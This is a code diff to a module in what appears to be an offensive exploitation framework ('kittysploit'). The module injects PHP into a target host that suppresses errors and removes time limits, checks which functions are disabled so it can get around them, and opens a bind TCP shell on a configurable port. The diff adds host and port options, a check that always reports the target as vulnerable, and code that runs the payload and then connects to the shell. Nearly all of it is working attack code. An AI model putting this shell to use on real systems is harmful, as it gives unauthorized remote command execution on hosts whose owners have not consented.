@@ -1,4 +1,5 @@
 from kittysploit import *
+from lib.exploit.handler import Bind
 
 class Module(Post, Bind):
 
@@ -6,11 +7,18 @@ class Module(Post, Bind):
 		"name": "Bind TCP shell",
 		"description": "Bind TCP shell in PHP using a bind handler",
 		"arch": Arch.PHP,
-	}	
+	}
+	
+	rhost = OptString("", "Remote host where PHP bind shell is running", required=True)
+	rport = OptPort(6666, "Remote port where PHP bind shell is listening", required=True)
+	
+	def check(self):
+		"""Check if target is vulnerable"""
+		return True
 		
 	def run(self):
-		self.start_handler()
-		self.php_eval(f"""
+		# Use raw f-string to preserve PHP braces
+		data = rf"""
 		  @error_reporting(0);
 		  @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
 		  $TSChg=@ini_get('disable_functions');
@@ -22,7 +30,7 @@ class Module(Post, Bind):
 			$TSChg=array();
 		  }}
 		  
-		$port=6666;
+		$port=RPORT_PLACEHOLDER;
 
 		$scl='socket_create_listen';
 		if(is_callable($scl)&&!in_array($scl,$TSChg)){{
@@ -98,4 +106,23 @@ class Module(Post, Bind):
 		  @socket_write($msgsock,$o,strlen($o));
 		}}
 		@socket_close($msgsock);
-""")
+"""
+		# Replace port placeholder with actual port
+		rport_val = int(self.rport.value) if hasattr(self.rport, 'value') else int(self.rport)
+		data = data.replace("RPORT_PLACEHOLDER", str(rport_val))
+		
+		# Execute PHP code to start bind shell
+		print_info("Starting bind shell on target...")
+		self.cmd_execute(data)
+		
+		# Wait a moment for bind shell to start
+		import time
+		time.sleep(2)
+		
+		# Connect to the bind shell
+		print_info(f"Connecting to bind shell at {self.rhost}:{self.rport}...")
+		if not self.start_handler():
+			print_error("Failed to connect to bind shell")
+			return False
+		
+		return True
